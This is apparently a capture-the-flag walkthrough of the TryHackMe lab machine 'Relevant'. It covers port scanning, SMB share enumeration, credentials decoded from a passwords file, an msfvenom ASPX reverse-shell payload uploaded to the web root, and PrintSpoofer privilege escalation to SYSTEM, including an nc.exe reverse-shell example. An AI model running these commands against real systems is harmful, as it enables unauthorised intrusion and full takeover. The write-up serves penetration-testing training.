To make it easier first of all I performed a mass scan which dicovered below listed ports:

--> sudo masscan -e tun0 -p1-65535, --U:1-65535 10.10.28.239 --rate=100
      Discovered open port 80/tcp on 10.10.28.239
      Discovered open port 135/tcp on 10.10.28.239
      Discovered open port 139/tcp on 10.10.28.239
      Discovered open port 445/tcp on 10.10.28.239
      Discovered open port 3389/tcp on 10.10.28.239
      Discovered open port 49663/tcp on 10.10.28.239
      Discovered open port 49667/tcp on 10.10.28.239
      Discovered open port 49669/tcp on 10.10.28.239

Interesting list of open ports. Let's do one better with nmap scanning the discovered ports to establish their services.
------------------------------------------------------------------------------
--> nmap -sC -sV -p80,445,135,139,49667,49669,49663,3389 -oA nmap/Relevent 10.10.28.239
    output:

    80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        |_http-title: IIS Windows Server
    135/tcp   open  msrpc          Microsoft Windows RPC
    139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds    3389/tcp  open  ms-wbt-server?
        |   Target_Name: RELEVANT
        |   NetBIOS_Domain_Name: RELEVANT
        |   NetBIOS_Computer_Name: RELEVANT
        |   DNS_Domain_Name: Relevant
        |   DNS_Computer_Name: Relevant
        |   Product_Version: 10.0.14393
        |_  System_Time: 2020-09-20T06:39:55+00:00
        | ssl-cert: Subject: commonName=Relevant
        | Not valid before: 2020-07-24T23:16:08
        |_Not valid after:  2021-01-23T23:16:08
        |_ssl-date: 2020-09-20T06:40:33+00:00; -7s from scanner time.
    49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        |_http-title: IIS Windows Server
    49667/tcp open  msrpc          Microsoft Windows RPC
    49669/tcp open  msrpc          Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
          Host script results:
              |_clock-skew: mean: 1h23m53s, deviation: 3h07m52s, median: -7s
              | smb-os-discovery: 
              |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
              |   Computer name: Relevant
              |   NetBIOS computer name: RELEVANT\x00
              |   Workgroup: WORKGROUP\x00
              |_  System time: 2020-09-19T23:39:51-07:00
              | smb-security-mode: 
              |   account_used: guest
              |   authentication_level: user
              |   challenge_response: supported
              |_  message_signing: disabled (dangerous, but default)
              | smb2-security-mode: 
              |   2.02: 
              |_    Message signing enabled but not required
              | smb2-time: 
              |   date: 2020-09-20T06:39:56
              |_  start_date: 2020-09-20T06:24:29

Namp scan result showed that its a window box 

Then I bruteforce for directory using dirsearch.py. But found nothing with that search.

--> sudo python3 /opt/dirsearch/-dirsearch.py -u http://10.10.28.239/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,apsx -x 404,403

Let's, enumerate these ports and its running services, and which one is vulneable.
------------------------------------------------------------------------------
smbclient -L 10.10.83.165
Enter WORKGROUP\su's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk

-------------------------------------------------------------------
smbclient \\\\10.10.83.165\\nt4wrksv

Enter WORKGROUP\su's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 26 03:16:04 2020
  ..                                  D        0  Sun Jul 26 03:16:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

		7735807 blocks of size 4096. 4945728 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

------------------------------------------------------------------------------------

echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
- - - - - - - - - - -
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
Got nothing from these credentials.
--------------------------------------------------------------------------------------

This password file is able to access where we can upload our exploit to get a reverse shell
http://10.10.158.115:49663/nt4wrksv/password.txt

--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.45.62 LPORT=1234 -f aspx -o payload.aspx

smb: \> put payload.aspx

And finally we got foothold on the machine.

c:\Users\Bob\Desktop>whoami /priv

smb: \> put PrintSpoofer.exe

09/22/2020  05:40 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
09/22/2020  05:40 AM             3,423 payload.aspx
09/22/2020  05:38 AM            27,136 PrintSpoofer.exe


c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -h
PrintSpoofer.exe -h

PrintSpoofer v0.1 (by @itm4n)

  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

Arguments:
  -c <CMD>    Execute the command *CMD*
  -i          Interact with the new process in the current command prompt (default is non-interactive)
  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      PrintSpoofer.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the desktop of the session 1
      PrintSpoofer.exe -d 1 -c cmd.exe
  - Get a SYSTEM reverse shell
      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"


c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\Users\Administrator\Desktop
cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,272,693,248 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
